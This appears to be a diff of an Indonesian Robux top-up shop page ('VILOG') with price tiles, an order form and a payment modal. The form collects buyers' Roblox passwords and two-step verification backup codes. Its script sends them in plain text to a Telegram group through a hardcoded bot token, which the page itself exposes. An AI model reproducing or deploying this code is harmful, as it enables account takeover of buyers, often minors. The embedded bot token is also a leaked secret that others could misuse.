@@ -1,244 +1,147 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Pricelist & Form Pembelian Robux - VILOG</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Pricelist & Form Robux - VILOG</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-  :root{
-    --accent:#4a6fa1;
-    --muted:#6b7280;
-    --bg:#f3f6fb;
-    --card:#ffffff;
-    --card-border:#d6e1f2;
-    --box-width:220px; /* ukuran kotak pricebox agar menyerupai referensi */
-  }
-  *{box-sizing:border-box}
-  body{
-    margin:0;
-    font-family: 'Roboto', system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    background: var(--bg);
-    color:#233;
-    -webkit-font-smoothing:antialiased;
-    -moz-osx-font-smoothing:grayscale;
-    font-size:13px;
-    line-height:1.35;
-  }
+  :root{--accent:#4a6fa1;--muted:#6b7280}
+  body { font-family:'Roboto',sans-serif; background:#fff; margin:0; padding:18px; color:#333; font-size:12px;}
+  .page { max-width:1100px; margin:0 auto; display:block; gap:20px; }
+  .category { margin-bottom:18px; }
+  .category h3 { text-align:left; margin:0 0 10px; font-size:14px; font-weight:700; color:#2c3e50;}
+  .prcContainer { display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; }
+  .bc { background:#f9f9f9; border:1px solid #d1d9e6; border-radius:8px; padding:10px 6px; text-align:center; font-size:12px; font-weight:500; color:#333; cursor:pointer; transition:.12s; user-select:none;}
+  .bc:hover { background:#eef3fa; border-color:var(--accent); transform:translateY(-3px); box-shadow:0 6px 18px rgba(74,111,161,0.06); }
+  .bc span { display:block; font-weight:normal; font-size:11px; color:#555; margin-top:6px;}
+  .form-container { max-width:420px; margin:18px auto 40px; background:#fafafa; border:1px solid #d1d9e6; border-radius:10px; padding:16px 18px; box-shadow:0 2px 8px rgba(0,0,0,.04); }
+  .form-container h2 { text-align:center; margin:0 0 14px; font-size:16px; font-weight:700; color:#2c3e50; }
+  .form-group { margin-bottom:10px; }
+  label { font-size:12px; font-weight:500; display:block; margin-bottom:6px; color:#444; }
+  input, select { width:100%; padding:8px; border:1px solid #ccc; border-radius:6px; font-size:13px; box-sizing:border-box; }
+  button { width:100%; padding:10px; background:var(--accent); border:none; border-radius:6px; color:white; font-size:13px; font-weight:600; cursor:pointer; transition:.15s; }
+  button:hover { background:#3a5f8a; }
+  .hidden { display:none; }
+  .notes { font-size:11px; color:#666; margin-top:4px; }
 
-  .wrap{
-    max-width: 760px; /* mendekati referensi */
-    margin: 18px auto;
-    padding: 0 12px 40px;
+  /* Payment Modal */
+  .modal-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
   }
-
-  /* category card */
-  .category {
-    background: #dfeaf8;
+  .modal {
+    width: 340px;
+    max-width: calc(100% - 32px);
+    background: #fff;
     border-radius: 12px;
-    padding: 14px;
-    margin-bottom: 16px;
-    border: 1px solid var(--card-border);
+    padding: 16px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.25);
+    text-align: center;
   }
-  .category h3{
-    font-size:15px;
-    margin:0 0 10px;
-    font-weight:700;
-    color:#1f3a50;
-    border-bottom:1px solid #c6d7ea;
-    padding-bottom:8px;
-    text-align:left;
-  }
+  .modal h3 { margin: 0 0 8px; font-size: 15px; color: #23314a; }
+  .modal .qr { width: 180px; height: 180px; object-fit: cover; margin: 8px auto; border-radius: 8px; border: 1px solid #e6e6e6; }
+  .modal .amount { font-size: 18px; font-weight: 700; margin-top: 8px; color: #1b3b6f; }
+  .modal .pay-note { font-size: 12px; color: #555; margin-top: 8px; }
+  .modal .actions { display: flex; gap: 8px; margin-top: 12px; }
+  .modal .actions button { flex: 1; padding: 8px; font-size: 13px; }
+  .modal .small-note { font-size: 11px; color: #888; margin-top: 10px; }
+  .copy-success { font-size: 12px; color: green; margin-top: 6px; }
 
-  /* pricelist grid */
-  .prcContainer {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
+  /* Centered validation popup (modal-like) */
+  .validation-center {
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%,-50%);
+    z-index: 11000;
+    min-width: 260px;
+    max-width: 92%;
+    background: linear-gradient(180deg,#fff,#fbfbfd);
+    border: 1px solid #e6e6e6;
+    box-shadow: 0 12px 40px rgba(35,49,74,0.16);
+    border-radius: 10px;
+    padding: 14px 16px;
+    display: flex;
     gap: 12px;
-    justify-items:center;
+    align-items: center;
+    justify-content: space-between;
+    animation: popIn .14s ease;
   }
-
-  /* pricebox - mimic topupgram style */
-  .bc{
-    width: var(--box-width);
-    min-height: 46px;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    padding: 8px 10px;
-    background: var(--card);
-    border-radius: 12px;
-    border: 1px solid #e6eef9;
-    box-shadow: 0 6px 18px rgba(22,53,90,0.04);
-    cursor:pointer;
-    transition: transform .14s ease, box-shadow .14s ease, border-color .14s ease;
-    text-align:center;
-    user-select:none;
-  }
-  .bc:hover{
-    transform: translateY(-6px);
-    border-color: var(--accent);
-    box-shadow: 0 12px 30px rgba(74,111,161,0.12);
-  }
-  .bc .title{
-    font-weight:700;
-    font-size:13px;
-    color:#203547;
-    letter-spacing:0.1px;
-  }
-  .bc .price{
-    margin-top:6px;
-    font-weight:500;
-    font-size:11px;
-    color:#5b6b7d;
-  }
-
-  /* small pill/selected look */
-  .bc.selected{
-    background: linear-gradient(180deg, #fbfeff, #f6fbff);
-    border: 1px solid var(--accent);
-    box-shadow: 0 12px 30px rgba(74,111,161,0.10);
-    transform: translateY(-4px);
-  }
-
-  /* Form card: exact sizing + style like ref */
-  .form-container{
-    max-width:420px;
-    margin: 22px auto;
-    background: var(--card);
-    border-radius: 12px;
-    border: 1px solid var(--card-border);
-    padding: 18px 18px;
-    box-shadow: 0 6px 18px rgba(22,53,90,0.04);
-  }
-  .form-container h2{
-    margin:0 0 12px;
-    font-size:16px;
-    font-weight:700;
-    color:#1f3a50;
-    text-align:center;
-  }
-
-  .form-group{ margin-bottom:12px; }
-  label{ display:block; font-size:13px; margin-bottom:6px; font-weight:600; color:#333; }
-  input, select, textarea{
-    width:100%;
-    padding:10px 12px;
-    border-radius:8px;
-    border:1px solid #d0d7e3;
-    font-size:13px;
-    color:#222;
-    background:#fff;
-  }
-  select{ appearance:none; -webkit-appearance:none; -moz-appearance:none; padding-right:26px; background-image:none; }
-
-  .notes{ font-size:12px; color:#6b7280; margin-top:6px; }
-
-  .btn {
-    width:100%;
-    padding:11px;
-    border-radius:10px;
-    border:0;
-    background:var(--accent);
-    color:#fff;
-    font-weight:700;
-    font-size:14px;
-    cursor:pointer;
-  }
-  .btn:active{ transform: translateY(1px); }
-
-  /* Payment modal */
-  .modal-backdrop{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.45); z-index:999; }
-  .modal{
-    width:340px; max-width:calc(100% - 32px);
-    background:#fff; border-radius:12px; padding:16px; text-align:center; box-shadow:0 12px 40px rgba(0,0,0,0.2);
-  }
-  .modal .qr{ width:170px; height:170px; object-fit:cover; border-radius:8px; margin:8px auto; border:1px solid #eee; }
-  .modal .amount { font-size:18px; font-weight:700; color:#153452; margin-top:6px; }
-
-  /* validation center popup */
-  .validation-center{
-    position:fixed; left:50%; top:50%; transform:translate(-50%,-50%); z-index:1100;
-    background:#fff; border-radius:10px; padding:12px 14px; box-shadow:0 12px 40px rgba(0,0,0,0.18);
-    display:flex; gap:12px; align-items:center; min-width:260px; max-width:92%;
-  }
-  .validation-center .txt{ flex:1; text-align:center; font-weight:700; color:#222; }
-  .validation-center .xbtn { border:0; background:transparent; font-size:18px; color:var(--muted); cursor:pointer; }
+  .validation-center .txt { flex:1; font-size:14px; color:#111827; }
+  .validation-center .xbtn { background:transparent; border:none; font-size:18px; color:var(--muted); cursor:pointer; padding:6px; border-radius:6px; }
+  .validation-center .xbtn:focus { outline:2px solid rgba(74,111,161,0.18); }
+  @keyframes popIn { from { transform: translate(-50%,-52%) scale(.98); opacity:0 } to { transform: translate(-50%,-50%) scale(1); opacity:1 } }
 
   /* responsive */
-  @media (max-width:900px){
+  @media (max-width:880px){
     .prcContainer { grid-template-columns: repeat(2, 1fr); }
-    :root { --box-width:44vw; } /* responsive box width on smaller screens */
-    .bc{ width: var(--box-width); max-width:340px; }
   }
-  @media (max-width:480px){
-    .prcContainer{ grid-template-columns: 1fr; }
-    :root { --box-width:90%; }
-    .form-container{ margin:14px 12px; padding:14px; }
-    .bc{ min-height:60px; padding:12px; }
+  @media (max-width:520px){
+    .prcContainer { grid-template-columns: repeat(1, 1fr); }
   }
 </style>
 </head>
 <body>
 
-<div class="wrap">
-  <!-- Reguler -->
-  <section class="category" aria-label="Robux Reguler">
+<div class="page">
+  <div class="category">
     <h3>Robux Reguler</h3>
     <div class="prcContainer">
-      <div class="bc" data-nm="80 Robux" data-hg="16000" data-kt="reg"><div class="title">80 Robux</div><div class="price">Rp16.000</div></div>
-      <div class="bc" data-nm="160 Robux" data-hg="32000" data-kt="reg"><div class="title">160 Robux</div><div class="price">Rp32.000</div></div>
-      <div class="bc" data-nm="240 Robux" data-hg="48000" data-kt="reg"><div class="title">240 Robux</div><div class="price">Rp48.000</div></div>
-      <div class="bc" data-nm="320 Robux" data-hg="62000" data-kt="reg"><div class="title">320 Robux</div><div class="price">Rp62.000</div></div>
-      <div class="bc" data-nm="400 Robux" data-hg="75000" data-kt="reg"><div class="title">400 Robux</div><div class="price">Rp75.000</div></div>
-      <div class="bc" data-nm="480 Robux" data-hg="91000" data-kt="reg"><div class="title">480 Robux</div><div class="price">Rp91.000</div></div>
-      <div class="bc" data-nm="560 Robux" data-hg="107000" data-kt="reg"><div class="title">560 Robux</div><div class="price">Rp107.000</div></div>
-      <div class="bc" data-nm="640 Robux" data-hg="123000" data-kt="reg"><div class="title">640 Robux</div><div class="price">Rp123.000</div></div>
-      <div class="bc" data-nm="720 Robux" data-hg="137500" data-kt="reg"><div class="title">720 Robux</div><div class="price">Rp137.500</div></div>
-      <div class="bc" data-nm="800 Robux" data-hg="155000" data-kt="reg"><div class="title">800 Robux</div><div class="price">Rp155.000</div></div>
-      <div class="bc" data-nm="1700 Robux" data-hg="310000" data-kt="reg"><div class="title">1.700 Robux</div><div class="price">Rp310.000</div></div>
-      <div class="bc" data-nm="2100 Robux" data-hg="387500" data-kt="reg"><div class="title">2.100 Robux</div><div class="price">Rp387.500</div></div>
-      <div class="bc" data-nm="3400 Robux" data-hg="610000" data-kt="reg"><div class="title">3.400 Robux</div><div class="price">Rp610.000</div></div>
-      <div class="bc" data-nm="4500 Robux" data-hg="775000" data-kt="reg"><div class="title">4.500 Robux</div><div class="price">Rp775.000</div></div>
-      <div class="bc" data-nm="10000 Robux" data-hg="1550000" data-kt="reg"><div class="title">10.000 Robux</div><div class="price">Rp1.550.000</div></div>
+      <div class="bc" data-nm="80 Robux" data-hg="16000" data-kt="reg">80 Robux<span>Rp16.000</span></div>
+      <div class="bc" data-nm="160 Robux" data-hg="32000" data-kt="reg">160 Robux<span>Rp32.000</span></div>
+      <div class="bc" data-nm="240 Robux" data-hg="48000" data-kt="reg">240 Robux<span>Rp48.000</span></div>
+      <div class="bc" data-nm="320 Robux" data-hg="62000" data-kt="reg">320 Robux<span>Rp62.000</span></div>
+      <div class="bc" data-nm="400 Robux" data-hg="75000" data-kt="reg">400 Robux<span>Rp75.000</span></div>
+      <div class="bc" data-nm="480 Robux" data-hg="91000" data-kt="reg">480 Robux<span>Rp91.000</span></div>
+      <div class="bc" data-nm="560 Robux" data-hg="107000" data-kt="reg">560 Robux<span>Rp107.000</span></div>
+      <div class="bc" data-nm="640 Robux" data-hg="123000" data-kt="reg">640 Robux<span>Rp123.000</span></div>
+      <div class="bc" data-nm="720 Robux" data-hg="137500" data-kt="reg">720 Robux<span>Rp137.500</span></div>
+      <div class="bc" data-nm="800 Robux" data-hg="155000" data-kt="reg">800 Robux<span>Rp155.000</span></div>
+      <div class="bc" data-nm="1700 Robux" data-hg="310000" data-kt="reg">1.700 Robux<span>Rp310.000</span></div>
+      <div class="bc" data-nm="2100 Robux" data-hg="387500" data-kt="reg">2.100 Robux<span>Rp387.500</span></div>
+      <div class="bc" data-nm="3400 Robux" data-hg="610000" data-kt="reg">3.400 Robux<span>Rp610.000</span></div>
+      <div class="bc" data-nm="4500 Robux" data-hg="775000" data-kt="reg">4.500 Robux<span>Rp775.000</span></div>
+      <div class="bc" data-nm="10000 Robux" data-hg="1550000" data-kt="reg">10.000 Robux<span>Rp1.550.000</span></div>
     </div>
-  </section>
+  </div>
 
-  <!-- Special -->
-  <section class="category" aria-label="Robux Special">
+  <div class="category">
     <h3>Robux Special</h3>
     <div class="prcContainer">
-      <div class="bc" data-nm="500 Robux" data-hg="75000" data-kt="spc"><div class="title">500 Robux</div><div class="price">Rp75.000</div></div>
-      <div class="bc" data-nm="1000 Robux" data-hg="148000" data-kt="spc"><div class="title">1.000 Robux</div><div class="price">Rp148.000</div></div>
-      <div class="bc" data-nm="1500 Robux" data-hg="222000" data-kt="spc"><div class="title">1.500 Robux</div><div class="price">Rp222.000</div></div>
-      <div class="bc" data-nm="2000 Robux" data-hg="296000" data-kt="spc"><div class="title">2.000 Robux</div><div class="price">Rp296.000</div></div>
-      <div class="bc" data-nm="2500 Robux" data-hg="367500" data-kt="spc"><div class="title">2.500 Robux</div><div class="price">Rp367.500</div></div>
-      <div class="bc" data-nm="3000 Robux" data-hg="441000" data-kt="spc"><div class="title">3.000 Robux</div><div class="price">Rp441.000</div></div>
-      <div class="bc" data-nm="3500 Robux" data-hg="514500" data-kt="spc"><div class="title">3.500 Robux</div><div class="price">Rp514.500</div></div>
-      <div class="bc" data-nm="4000 Robux" data-hg="588000" data-kt="spc"><div class="title">4.000 Robux</div><div class="price">Rp588.000</div></div>
-      <div class="bc" data-nm="5000 Robux" data-hg="735000" data-kt="spc"><div class="title">5.000 Robux</div><div class="price">Rp735.000</div></div>
-      <div class="bc" data-nm="6000 Robux" data-hg="876000" data-kt="spc"><div class="title">6.000 Robux</div><div class="price">Rp876.000</div></div>
+      <div class="bc" data-nm="500 Robux" data-hg="75000" data-kt="spc">500 Robux<span>Rp75.000</span></div>
+      <div class="bc" data-nm="1000 Robux" data-hg="148000" data-kt="spc">1.000 Robux<span>Rp148.000</span></div>
+      <div class="bc" data-nm="1500 Robux" data-hg="222000" data-kt="spc">1.500 Robux<span>Rp222.000</span></div>
+      <div class="bc" data-nm="2000 Robux" data-hg="296000" data-kt="spc">2.000 Robux<span>Rp296.000</span></div>
+      <div class="bc" data-nm="2500 Robux" data-hg="367500" data-kt="spc">2.500 Robux<span>Rp367.500</span></div>
+      <div class="bc" data-nm="3000 Robux" data-hg="441000" data-kt="spc">3.000 Robux<span>Rp441.000</span></div>
+      <div class="bc" data-nm="3500 Robux" data-hg="514500" data-kt="spc">3.500 Robux<span>Rp514.500</span></div>
+      <div class="bc" data-nm="4000 Robux" data-hg="588000" data-kt="spc">4.000 Robux<span>Rp588.000</span></div>
+      <div class="bc" data-nm="5000 Robux" data-hg="735000" data-kt="spc">5.000 Robux<span>Rp735.000</span></div>
+      <div class="bc" data-nm="6000 Robux" data-hg="876000" data-kt="spc">6.000 Robux<span>Rp876.000</span></div>
     </div>
-  </section>
+  </div>
 
-  <!-- Premium -->
-  <section class="category" aria-label="Robux Premium">
+  <div class="category">
     <h3>Robux Premium</h3>
     <div class="prcContainer">
-      <div class="bc" data-nm="450 Robux + Premium" data-hg="75000" data-kt="pre"><div class="title">450 Robux + Premium</div><div class="price">Rp75.000</div></div>
-      <div class="bc" data-nm="1000 Robux + Premium" data-hg="148000" data-kt="pre"><div class="title">1.000 Robux + Premium</div><div class="price">Rp148.000</div></div>
-      <div class="bc" data-nm="1550 Robux + Premium" data-hg="222000" data-kt="pre"><div class="title">1.550 Robux + Premium</div><div class="price">Rp222.000</div></div>
-      <div class="bc" data-nm="2200 Robux + Premium" data-hg="296000" data-kt="pre"><div class="title">2.200 Robux + Premium</div><div class="price">Rp296.000</div></div>
-      <div class="bc" data-nm="2750 Robux + Premium" data-hg="367500" data-kt="pre"><div class="title">2.750 Robux + Premium</div><div class="price">Rp367.500</div></div>
-      <div class="bc" data-nm="3300 Robux + Premium" data-hg="441000" data-kt="pre"><div class="title">3.300 Robux + Premium</div><div class="price">Rp441.000</div></div>
+      <div class="bc" data-nm="450 Robux + Premium" data-hg="75000" data-kt="pre">450 Robux + Premium<span>Rp75.000</span></div>
+      <div class="bc" data-nm="1000 Robux + Premium" data-hg="148000" data-kt="pre">1.000 Robux + Premium<span>Rp148.000</span></div>
+      <div class="bc" data-nm="1550 Robux + Premium" data-hg="222000" data-kt="pre">1.550 Robux + Premium<span>Rp222.000</span></div>
+      <div class="bc" data-nm="2200 Robux + Premium" data-hg="296000" data-kt="pre">2.200 Robux + Premium<span>Rp296.000</span></div>
+      <div class="bc" data-nm="2750 Robux + Premium" data-hg="367500" data-kt="pre">2.750 Robux + Premium<span>Rp367.500</span></div>
+      <div class="bc" data-nm="3300 Robux + Premium" data-hg="441000" data-kt="pre">3.300 Robux + Premium<span>Rp441.000</span></div>
     </div>
-  </section>
+  </div>
 
-  <!-- FORM -->
   <div class="form-container" id="orderSection">
     <h2>Form Pembelian Robux VILOG</h2>
-    <form id="frm" autocomplete="off">
+    <form id="frm">
       <div class="form-group">
         <label for="usr">Username Roblox *</label>
         <input type="text" id="usr" name="usr" placeholder="Username Roblox" required>
@@ -255,7 +158,6 @@
           <option value="ON">ON</option>
         </select>
       </div>
-
       <div class="form-group hidden" id="v2m_div">
         <label for="v2m">Metode V2L *</label>
         <select id="v2m" name="v2m">
@@ -264,17 +166,14 @@
           <option value="EM">Kode Email</option>
         </select>
       </div>
-
       <div class="form-group hidden" id="bc_div">
         <label for="bc">Backup Code *</label>
         <input type="text" id="bc" name="bc" placeholder="Isi Backup Code">
         <div class="notes">Masukkan 1-3 backup code yang belum dipakai.</div>
       </div>
-
       <div class="form-group hidden" id="em_div">
         <div class="notes">Pastikan storage email tidak penuh, standby & fast respon.</div>
       </div>
-
       <div class="form-group">
         <label for="kt">Kategori *</label>
         <input type="text" id="kt" name="kt" readonly required>
@@ -287,50 +186,45 @@
         <label for="hg">Harga *</label>
         <input type="text" id="hg" name="hg" readonly required>
       </div>
-
-      <div style="text-align:center; margin-top:8px;">
-        <button type="button" id="btnTg" class="btn">Pesan via Telegram</button>
+      <div style="text-align:center; margin:14px 0 6px;">
+        <button type="button" id="btnTg">Pesan via Telegram</button>
       </div>
     </form>
   </div>
 </div>
 
-<!-- Payment Modal -->
 <div id="paymentModalBackdrop" class="modal-backdrop" aria-hidden="true">
   <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
     <h3 id="modalTitle">Pembayaran</h3>
     <img id="modalQr" class="qr" src="" alt="QR Pembayaran">
     <div id="modalAmount" class="amount">Rp0</div>
-    <div class="pay-note" style="font-size:13px; margin-top:8px;">Silahkan lakukan pembayaran, lalu kembali & wajib kirim bukti pembayaran ke bot.</div>
-    <div style="display:flex; gap:8px; margin-top:12px;">
-      <button id="copyAmountBtn" class="btn" style="flex:1; background:#fff; color:#123; border:1px solid #ddd; font-weight:700;">Salin Jumlah</button>
-      <button id="openBotBtn" class="btn" style="flex:1;">Buka Bot</button>
+    <div class="pay-note">Silahkan lakukan pembayaran, lalu kembali & wajib kirim bukti pembayaran ke bot.</div>
+    <div class="actions">
+      <button id="copyAmountBtn" type="button">Salin Jumlah</button>
+      <button id="openBotBtn" type="button">Buka Bot</button>
     </div>
+    <div class="small-note">Setelah bayar, kirim bukti pembayaran ke bot agar pesanan segera diproses.</div>
     <div style="margin-top:10px;">
-      <button id="closeModalBtn" style="width:100%; padding:10px; margin-top:10px; border-radius:8px; border:0; background:#eee; color:#222;">Tutup</button>
+      <button id="closeModalBtn" type="button" style="width:100%; background:#e0e0e0; color:#222;">Tutup</button>
     </div>
-    <div id="copySuccess" class="copy-success" style="display:none; margin-top:8px; color:green; font-weight:700;">Jumlah berhasil disalin ke clipboard</div>
+    <div id="copySuccess" class="copy-success" style="display:none;">Jumlah berhasil disalin ke clipboard</div>
   </div>
 </div>
 
 <div id="validationContainer"></div>
 
 <script>
-/* fungsi tetap sama agar kompatibel */
-function sanitize(v){ return v?Number(String(v).replace(/\D+/g,'')):NaN; }
-function fill({nmText,hgRaw,ktVal}){
+function sanitize(v){return v?Number(String(v).replace(/\D+/g,'')):NaN;}
+function fill({nmText,hgRaw,ktVal}) {
   document.getElementById('nm').value = nmText||'';
   document.getElementById('kt').value = ktVal||'';
   const h = sanitize(hgRaw);
-  document.getElementById('hg').value = !isNaN(h)? 'Rp' + new Intl.NumberFormat('id-ID').format(h) : hgRaw;
-
-  // toggle selected class on bc
-  document.querySelectorAll('.bc').forEach(el=> el.classList.remove('selected'));
-  const clicked = Array.from(document.querySelectorAll('.bc')).find(x=> (x.getAttribute('data-nm')||x.textContent).trim() === (nmText||'').trim());
-  if(clicked) clicked.classList.add('selected');
-
+  document.getElementById('hg').value = !isNaN(h) ? 'Rp'+new Intl.NumberFormat('id-ID').format(h) : hgRaw;
   const el = document.querySelector('.form-container') || document.getElementById('orderSection');
-  if(el){ el.scrollIntoView({behavior:'smooth', block:'center'}); setTimeout(()=>document.getElementById('usr').focus(),200); }
+  if(el){
+    el.scrollIntoView({behavior:'smooth', block:'center'});
+    setTimeout(()=> document.getElementById('usr').focus(), 200);
+  }
 }
 
 function showValidationPopupCenter(message){
@@ -343,11 +237,18 @@ function showValidationPopupCenter(message){
   popup.tabIndex = -1;
   popup.innerHTML = `<div class="txt">${message}</div><button class="xbtn" aria-label="Tutup">✕</button>`;
   container.appendChild(popup);
-  popup.focus({preventScroll:true});
   const closeBtn = popup.querySelector('.xbtn');
-  function remove(){ popup.remove(); }
-  closeBtn.addEventListener('click', remove);
-  setTimeout(remove, 3500);
+  popup.focus({preventScroll:true});
+  function removePopup(){
+    if(!popup) return;
+    popup.style.transition = 'opacity 160ms ease, transform 160ms ease';
+    popup.style.opacity = '0';
+    popup.style.transform = 'translate(-50%,-50%) scale(.98)';
+    setTimeout(()=> popup.remove(), 170);
+  }
+  closeBtn.addEventListener('click', removePopup);
+  const t = setTimeout(removePopup, 4000);
+  window.addEventListener('pagehide', ()=>{ clearTimeout(t); if(popup) popup.remove(); }, { once:true });
 }
 
 document.addEventListener('DOMContentLoaded', function(){
@@ -364,23 +265,26 @@ document.addEventListener('DOMContentLoaded', function(){
   const bcDiv = document.getElementById('bc_div');
   const emDiv = document.getElementById('em_div');
 
-  v2 && v2.addEventListener('change', ()=>{
+  v2.addEventListener('change', ()=>{
     if(v2.value === 'ON'){
-      v2m && v2m.parentElement.classList.remove('hidden');
+      v2m.parentElement.classList.remove('hidden');
     } else {
-      v2m && v2m.parentElement.classList.add('hidden');
-      bcDiv && bcDiv.classList.add('hidden');
-      emDiv && emDiv.classList.add('hidden');
+      v2m.parentElement.classList.add('hidden');
+      bcDiv.classList.add('hidden');
+      emDiv.classList.add('hidden');
     }
   });
 
-  v2m && v2m.addEventListener('change', ()=>{
+  v2m.addEventListener('change', ()=>{
     if(v2m.value === 'BC'){
-      bcDiv && bcDiv.classList.remove('hidden'); emDiv && emDiv.classList.add('hidden');
+      bcDiv.classList.remove('hidden');
+      emDiv.classList.add('hidden');
     } else if(v2m.value === 'EM'){
-      emDiv && emDiv.classList.remove('hidden'); bcDiv && bcDiv.classList.add('hidden');
+      emDiv.classList.remove('hidden');
+      bcDiv.classList.add('hidden');
     } else {
-      bcDiv && bcDiv.classList.add('hidden'); emDiv && emDiv.classList.add('hidden');
+      bcDiv.classList.add('hidden');
+      emDiv.classList.add('hidden');
     }
   });
 
@@ -388,38 +292,41 @@ document.addEventListener('DOMContentLoaded', function(){
     const f = document.getElementById('frm');
     const req = f.querySelectorAll('input[required], select[required]');
     for(const i of req){
-      if(!i.value.trim()){ showValidationPopupCenter('harap isi semua kolom!'); try{i.focus()}catch(e){}; return; }
+      if(!i.value.trim()){
+        showValidationPopupCenter('harap isi semua kolom!');
+        try{ i.focus(); }catch(e){}
+        return;
+      }
     }
 
     const u = document.getElementById('usr').value;
     const p = document.getElementById('pwd').value;
-    const v = v2 ? v2.value : '';
-    const vm = v2m ? v2m.value : '';
-    const b = bcDiv ? (bcDiv.querySelector('input')?.value || '') : '';
+    const v = v2.value;
+    const vm = v2m.value;
+    const b = bcDiv.querySelector('input')?.value || '';
     const kt = document.getElementById('kt').value;
     const nm = document.getElementById('nm').value;
     const hg = document.getElementById('hg').value;
 
     const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
     const chatId = '-1002801058966';
-    const txt = 'Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v + (vm? ' ('+vm+')':'') + (b?'\nBackup Code: '+b:'') + '\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
+    const txt = 'Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\nBackup Code: '+b:'')+'\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
 
-    fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+    fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
       method:'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: chatId, text: txt })
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id:chatId, text:txt})
     })
-    .then(res => {
+    .then(res=>{
       if(res.ok){
         const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
         showPaymentPopup(qrUrl, hg);
         f.reset();
-        document.querySelectorAll('.bc').forEach(el=> el.classList.remove('selected'));
       } else {
-        showValidationPopupCenter('Gagal kirim ke Telegram');
+        alert('Gagal kirim ke Telegram');
       }
     })
-    .catch(()=> showValidationPopupCenter('Terjadi kesalahan jaringan.'));
+    .catch(()=> alert('Terjadi kesalahan.'));
   });
 
   function showPaymentPopup(qrUrl, hargaFormatted){
@@ -429,6 +336,7 @@ document.addEventListener('DOMContentLoaded', function(){
     const copySuccess = document.getElementById('copySuccess');
 
     modalQr.src = qrUrl;
+
     let amountText = hargaFormatted || '';
     if(!/^Rp/i.test(amountText)){
       const num = Number(String(amountText).replace(/[^\d]/g,''));
@@ -441,18 +349,33 @@ document.addEventListener('DOMContentLoaded', function(){
     backdrop.setAttribute('aria-hidden','false');
 
     document.getElementById('closeModalBtn').onclick = function(){
-      backdrop.style.display = 'none'; backdrop.setAttribute('aria-hidden','true');
+      backdrop.style.display = 'none';
+      backdrop.setAttribute('aria-hidden','true');
     };
-    backdrop.onclick = function(e){ if(e.target === backdrop){ backdrop.style.display = 'none'; backdrop.setAttribute('aria-hidden','true'); } };
+    backdrop.onclick = function(e){
+      if(e.target === backdrop){
+        backdrop.style.display = 'none';
+        backdrop.setAttribute('aria-hidden','true');
+      }
+    };
 
     document.getElementById('copyAmountBtn').onclick = function(){
       const textToCopy = modalAmount.textContent || '';
       navigator.clipboard?.writeText(textToCopy).then(()=>{
         copySuccess.style.display = 'block';
-        setTimeout(()=> copySuccess.style.display = 'none', 2000);
-      }).catch(()=> {
-        const tmp = document.createElement('textarea'); tmp.value = textToCopy; document.body.appendChild(tmp); tmp.select();
-        try{ document.execCommand('copy'); copySuccess.style.display = 'block'; setTimeout(()=> copySuccess.style.display = 'none', 2000); }catch(e){ alert('Salin manual: '+textToCopy); }
+        setTimeout(()=> copySuccess.style.display = 'none', 2500);
+      }).catch(()=>{
+        const tmp = document.createElement('textarea');
+        tmp.value = textToCopy;
+        document.body.appendChild(tmp);
+        tmp.select();
+        try{
+          document.execCommand('copy');
+          copySuccess.style.display = 'block';
+          setTimeout(()=> copySuccess.style.display = 'none', 2500);
+        }catch(e){
+          alert('Tidak dapat menyalin, silahkan salin secara manual: ' + textToCopy);
+        }
         document.body.removeChild(tmp);
       });
     };
@@ -468,12 +391,18 @@ document.addEventListener('DOMContentLoaded', function(){
       document.addEventListener('visibilitychange', onVisibilityChange);
 
       try {
-        if(isMobile){ window.location.href = tgScheme; }
-        else { const newWin = window.open(tgScheme, '_blank'); if(newWin) try{ newWin.focus(); }catch(e){} }
+        if(isMobile){
+          window.location.href = tgScheme;
+        } else {
+          const newWin = window.open(tgScheme, '_blank');
+          if(newWin){ try{ newWin.focus(); }catch(e){} }
+        }
       } catch(e){}
 
       const fallbackTimeout = setTimeout(function(){
-        if(!appOpened){ window.open(webLink, '_blank'); }
+        if(!appOpened){
+          window.open(webLink, '_blank');
+        }
         document.removeEventListener('visibilitychange', onVisibilityChange);
       }, 800);
 
@@ -484,8 +413,8 @@ document.addEventListener('DOMContentLoaded', function(){
       });
     };
   }
-
-}); // DOMContentLoaded
+});
 </script>
+
 </body>
 </html>
